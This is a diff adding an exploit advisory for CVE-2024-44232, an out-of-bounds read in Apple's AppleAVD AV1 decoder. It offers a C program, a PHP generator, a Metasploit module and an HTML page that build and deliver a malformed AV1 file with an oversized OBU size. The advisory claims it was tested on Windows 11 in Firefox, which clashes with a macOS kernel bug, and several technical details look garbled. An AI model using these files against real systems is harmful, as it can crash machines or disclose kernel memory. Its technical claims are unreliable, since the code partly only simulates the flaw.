@@ -1,0 +1,521 @@
+=============================================================================================================================================
+| # Title     : macOS Sonoma 14.5 potential kernel crash                                                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/202851/ &  CVE-2024-44232
+
+[+] Summary : 
+
+             The vulnerability resides in the AV1_Syntax::Parse_Header function, where the size of AV1 OBUs (Open Bitstream Units) is parsed incorrectly. 
+			 Due to insufficient validation of OBU sizes, a specially crafted AV1 video file can cause the parser to compute an excessively large size value. When this malformed size is later used during parsing, it can trigger an Out-of-Bounds Read.
+             This flaw is tracked as CVE-2024-44232, a critical out-of-bounds read vulnerability in Apple’s hardware-accelerated AppleAVD AV1 decoding kernel extension. 
+			 The issue affects macOS systems equipped with hardware AV1 decoder support.
+			 
+[+] Discovered by Google Project Zero, the vulnerability may lead to:
+
+    Kernel memory disclosure, or Kernel crashes (DoS)
+    simply by processing a malicious AV1 video file.
+
+
+[+]  POC : 
+
+for php : php poc.php
+
+Makefile for C PoC
+makefile
+
+# Makefile for CVE-2024-44232 PoC
+CC = gcc
+CFLAGS = -Wall -Wextra -std=c99
+TARGET = av1_poc
+SRC = av1_poc.c
+
+all: $(TARGET)
+
+$(TARGET): $(SRC)
+	$(CC) $(CFLAGS) -o $(TARGET) $(SRC)
+
+clean:
+	rm -f $(TARGET) *.av1
+
+test: $(TARGET)
+	./$(TARGET)
+
+.PHONY: all clean test
+
+🔧 Compilation and Usage
+For C Version:
+bash
+
+gcc -Wall -o av1_poc av1_poc.c
+./av1_poc
+
+************************
+C Language PoC :
+************************
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+// Basic OBU structure
+typedef struct {
+    uint8_t type;
+    uint8_t extension_flag;
+    uint8_t has_size;
+    uint64_t size;
+} obu_header_t;
+
+// Create malformed AV1 with oversized OBU
+void create_malformed_av1(uint8_t **buffer, size_t *size) {
+    // AV1 basic signature
+    uint8_t av1_signature[] = {0x81, 0x00, 0x00, 0x00};
+    
+    // OBU with extremely large size
+    obu_header_t obu;
+    obu.type = 0x0F; // Unknown/Padding type (triggers vulnerable path)
+    obu.extension_flag = 0x00;
+    obu.has_size = 0x01;
+    obu.size = 0xFFFFFFFFFFFFFFFF; // Maximum size
+    
+    // Calculate total size
+    size_t header_size = sizeof(av1_signature);
+    size_t obu_size = 4 + 8; // OBU header + encoded OBU size
+    *size = header_size + obu_size;
+    
+    // Allocate memory
+    *buffer = (uint8_t*)malloc(*size);
+    if (!*buffer) {
+        printf("Memory allocation failed\n");
+        return;
+    }
+    
+    // Copy signature
+    memcpy(*buffer, av1_signature, sizeof(av1_signature));
+    
+    // Build OBU header
+    uint8_t *ptr = *buffer + header_size;
+    
+    // Type and extension field
+    *ptr++ = (obu.type << 3) | (obu.extension_flag << 2) | (obu.has_size << 1);
+    
+    // Encoded OBU size (LEB128) - very large size
+    uint8_t leb128[] = {
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+        0xFF, 0xFF, 0xFF, 0xFF, 0x7F  // Stop byte
+    };
+    memcpy(ptr, leb128, sizeof(leb128));
+    ptr += sizeof(leb128);
+    
+    printf("Malformed AV1 file created:\n");
+    printf("- Total size: %zu bytes\n", *size);
+    printf("- OBU type: 0x%02X (Unknown)\n", obu.type);
+    printf("- OBU size: %llu (extremely large)\n", obu.size);
+}
+
+// Simulate vulnerable OBU parsing
+void simulate_obu_parsing(const uint8_t *data, size_t data_size) {
+    printf("\nSimulating OBU parsing...\n");
+    
+    const uint8_t *ptr = data + 4; // Skip AV1 signature
+    const uint8_t *end = data + data_size;
+    
+    if (ptr >= end) {
+        printf("Insufficient data\n");
+        return;
+    }
+    
+    // Read OBU header
+    uint8_t obu_header = *ptr++;
+    uint8_t obu_type = (obu_header >> 3) & 0x1F;
+    uint8_t extension_flag = (obu_header >> 2) & 0x1;
+    uint8_t has_size = (obu_header >> 1) & 0x1;
+    
+    printf("OBU Header:\n");
+    printf("- Type: 0x%02X\n", obu_type);
+    printf("- Extension flag: %d\n", extension_flag);
+    printf("- Has size: %d\n", has_size);
+    
+    if (!has_size) {
+        printf("No OBU size field\n");
+        return;
+    }
+    
+    // Simulate reading OBU size (vulnerable code)
+    uint64_t obu_size = 0;
+    int shift = 0;
+    int bytes_read = 0;
+    int max_bytes = 8;
+    
+    printf("Reading OBU size (LEB128):\n");
+    
+    while (bytes_read < max_bytes) {
+        if (ptr >= end) {
+            printf("End of data while reading size\n");
+            break;
+        }
+        
+        uint8_t byte = *ptr++;
+        bytes_read++;
+        
+        obu_size |= (uint64_t)(byte & 0x7F) << shift;
+        printf("  Byte %d: 0x%02X, Current size: %llu\n", 
+               bytes_read, byte, obu_size);
+        
+        if ((byte & 0x80) == 0) {
+            break;
+        }
+        
+        shift += 7;
+        if (bytes_read == max_bytes) {
+            printf("  Reached max bytes\n");
+            break;
+        }
+    }
+    
+    printf("Final OBU size: %llu\n", obu_size);
+    printf("Remaining buffer bytes: %ld\n", end - ptr);
+    
+    // Simulate the vulnerable out-of-bounds read
+    if (obu_type == 0x0F) { // Unknown/Padding type
+        printf("\nTriggering unknown OBU path...\n");
+        
+        // This simulates the vulnerable code:
+        // while ( v31 + v83 )  
+        // {  
+        //   if ( v8[v36 - 1 + v31 + v37 + v22 + v83--] )  
+        
+        size_t remaining_data = end - ptr;
+        if (obu_size > remaining_data) {
+            printf("❗ POTENTIAL OUT-OF-BOUNDS READ!\n");
+            printf("❗ OBU requests %llu bytes but only %zu bytes available\n", 
+                   obu_size, remaining_data);
+            printf("❗ Difference: %lld bytes beyond bounds\n", 
+                   obu_size - remaining_data);
+        } else {
+            printf("Sufficient data for OBU\n");
+        }
+    }
+}
+
+// Main test cycle
+int main() {
+    printf("=== CVE-2024-44232 PoC - AppleAVD OOB Read ===\n");
+    printf("Out-of-bounds read in AV1 decoding\n\n");
+    
+    uint8_t *malformed_av1 = NULL;
+    size_t file_size = 0;
+    
+    // Create malformed AV1 file
+    create_malformed_av1(&malformed_av1, &file_size);
+    
+    if (malformed_av1) {
+        // Simulate vulnerable processing
+        simulate_obu_parsing(malformed_av1, file_size);
+        
+        // Cleanup
+        free(malformed_av1);
+    }
+    
+    printf("\n=== Test completed ===\n");
+    return 0;
+}
+
+-********************
+PHP PoC
+-**/*/*/*/*/*/*/*/*/*/
+
+<?php
+/**
+ * CVE-2024-44232 PoC - AppleAVD Out-of-Bounds Read
+ * PHP malformed AV1 file generator
+ * by indoushka
+ */
+
+class AV1MalformedGenerator {
+    
+    private $debug = true;
+    
+    public function log($message) {
+        if ($this->debug) {
+            echo "[INFO] " . $message . "\n";
+        }
+    }
+    
+    public function generateMalformedAV1() {
+        $this->log("Generating malformed AV1 file for CVE-2024-44232");
+        
+        // AV1 signature
+        $av1_signature = "\x81\x00\x00\x00";
+        
+        // Create OBU with huge size
+        $obu_header = $this->createObuHeader(0x0F, false, true); // Unknown type
+        
+        // Create oversized LEB128
+        $leb128_size = $this->createLargeLeb128(0x7FFFFFFFFFFFFFFF);
+        
+        // Build the data
+        $malformed_data = $av1_signature . $obu_header . $leb128_size;
+        
+        $this->log("Malformed data generated:");
+        $this->log(" - Total size: " . strlen($malformed_data) . " bytes");
+        $this->log(" - OBU type: 0x0F (Unknown)");
+        $this->log(" - OBU size: extremely large");
+        
+        return $malformed_data;
+    }
+    
+    private function createObuHeader($type, $extension_flag, $has_size) {
+        $header = ($type << 3) | ($extension_flag << 2) | ($has_size << 1);
+        return chr($header);
+    }
+    
+    private function createLargeLeb128($size) {
+        $leb128 = "";
+        $value = $size;
+        
+        do {
+            $byte = $value & 0x7F;
+            $value >>= 7;
+            
+            if ($value != 0) {
+                $byte |= 0x80;
+            }
+            
+            $leb128 .= chr($byte);
+        } while ($value != 0);
+        
+        // Add extra bytes to make size huge
+        while (strlen($leb128) < 10) {
+            $leb128 .= chr(0xFF);
+        }
+        $leb128 .= chr(0x7F); // Stop byte
+        
+        $this->log("Created LEB128 size: " . strlen($leb128) . " bytes");
+        
+        return $leb128;
+    }
+    
+    public function saveToFile($filename = "malformed.av1") {
+        $data = $this->generateMalformedAV1();
+        
+        if (file_put_contents($filename, $data)) {
+            $this->log("File saved as: " . $filename);
+            $this->analyzeFile($filename);
+            return true;
+        } else {
+            $this->log("Failed to save file");
+            return false;
+        }
+    }
+    
+    private function analyzeFile($filename) {
+        $data = file_get_contents($filename);
+        $this->log("\nFile analysis:");
+        $this->log("Size: " . strlen($data) . " bytes");
+        $this->log("First bytes: " . bin2hex(substr($data, 0, 16)));
+        
+        // Simulate vulnerable parsing
+        $this->simulateVulnerableParsing($data);
+    }
+    
+    private function simulateVulnerableParsing($data) {
+        $this->log("\nSimulating vulnerable parsing:");
+        
+        if (strlen($data) < 5) {
+            $this->log("Insufficient data");
+            return;
+        }
+        
+        $ptr = 4; // Skip signature
+        $obu_header = ord($data[$ptr++]);
+        
+        $type = ($obu_header >> 3) & 0x1F;
+        $has_size = ($obu_header >> 1) & 0x1;
+        
+        $this->log("OBU header: 0x" . dechex($obu_header));
+        $this->log("Type: 0x" . dechex($type));
+        $this->log("Has size: " . $has_size);
+        
+        if ($has_size) {
+            $obu_size = 0;
+            $shift = 0;
+            $bytes_read = 0;
+            
+            while ($bytes_read < 10 && $ptr < strlen($data)) {
+                $byte = ord($data[$ptr++]);
+                $bytes_read++;
+                
+                $obu_size |= ($byte & 0x7F) << $shift;
+                
+                if (($byte & 0x80) == 0) {
+                    break;
+                }
+                
+                $shift += 7;
+            }
+            
+            $this->log("Parsed size: " . $obu_size);
+            $this->log("Remaining bytes: " . (strlen($data) - $ptr));
+            
+            if ($obu_size > (strlen($data) - $ptr)) {
+                $this->log("⚠️  POTENTIAL OUT-OF-BOUNDS READ!");
+                $this->log("⚠️  Requested: " . $obu_size . " bytes");
+                $this->log("⚠️  Available: " . (strlen($data) - $ptr) . " bytes");
+            }
+        }
+    }
+}
+
+// Usage
+if (php_sapi_name() === 'cli') {
+    $generator = new AV1MalformedGenerator();
+    
+    if (isset($argv[1])) {
+        $filename = $argv[1];
+    } else {
+        $filename = "cve_2024_44232_poc.av1";
+    }
+    
+    $generator->saveToFile($filename);
+    
+    echo "\n=== Test file generated ===\n";
+    echo "Use this file to test the vulnerability on macOS systems\n";
+    echo "with AppleAVD extension and hardware AV1 decoder support\n";
+}
+?>
+
+***********************
+Metasploit Module
+***********************
+##
+# Metasploit module for CVE-2024-44232
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+  
+  include Msf::Exploit::FILEFORMAT
+  
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'AppleAVD AV1 OBU Out-of-Bounds Read',
+      'Description'    => %q{
+        This module generates a malformed AV1 file that triggers
+        an out-of-bounds read in AppleAVD kernel extension.
+        CVE-2024-44232.
+      },
+      'Author'         => ['indoushka'],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['CVE', '2024-44232'],
+        ['URL', 'https://googleprojectzero.blogspot.com/']
+      ],
+      'DisclosureDate' => '2024-07-24'
+    ))
+    
+    register_options([
+      OptString.new('FILENAME', [true, 'The output filename', 'malformed.av1'])
+    ])
+  end
+  
+  def run
+    # AV1 signature
+    av1_signature = "\x81\x00\x00\x00"
+    
+    # OBU header with unknown type
+    obu_header = create_obu_header(0x0F, false, true)
+    
+    # Large LEB128 size
+    leb128_size = create_large_leb128(0x7FFFFFFFFFFFFFFF)
+    
+    # Build the file
+    malformed_data = av1_signature + obu_header + leb128_size
+    
+    print_status("Creating malformed AV1 file...")
+    print_status("Total size: #{malformed_data.length} bytes")
+    print_status("OBU type: 0x0F (Unknown)")
+    print_status("Large OBU size to trigger OOB read")
+    
+    file_create(malformed_data)
+    print_good("Malformed AV1 file created: #{datastore['FILENAME']}")
+  end
+  
+  def create_obu_header(type, extension_flag, has_size)
+    header = (type << 3) | (extension_flag ? 1 << 2 : 0) | (has_size ? 1 << 1 : 0)
+    [header].pack('C')
+  end
+  
+  def create_large_leb128(size)
+    leb128 = ""
+    value = size
+    
+    begin
+      byte = value & 0x7F
+      value >>= 7
+      
+      if value != 0
+        byte |= 0x80
+      end
+      
+      leb128 << [byte].pack('C')
+    end while value != 0
+    
+    # Make the size larger
+    while leb128.length < 10
+      leb128 << "\xFF"
+    end
+    leb128 << "\x7F"
+    
+    leb128
+  end
+end
+
+**************************
+HTML Test Page
+////////*****************
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2024-44232 Test</title>
+</head>
+<body>
+    <h1>indoushka-AppleAVD Vulnerability Test Page</h1>
+    
+    <video id="testVideo" width="320" height="240" controls>
+        <source src="malformed.av1" type="video/av1">
+        Browser does not support AV1.
+    </video>
+    
+    <script>
+        // Try to load the malformed video
+        const video = document.getElementById('testVideo');
+        
+        video.addEventListener('error', function(e) {
+            console.log('Video loading error:', e);
+            document.getElementById('status').innerHTML = 
+                'Error detected - vulnerability may have been triggered';
+        });
+        
+        video.addEventListener('load', function(e) {
+            document.getElementById('status').innerHTML = 
+                'Video loaded successfully';
+        });
+    </script>
+    
+    <div id="status">Preparing...</div>
+    <div id="info">
+        <p>This is a test for CVE-2024-44232 in AppleAVD</p>
+        <p>On macOS systems with hardware AV1 decoder support</p>
+    </div>
+</body>
+</html>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
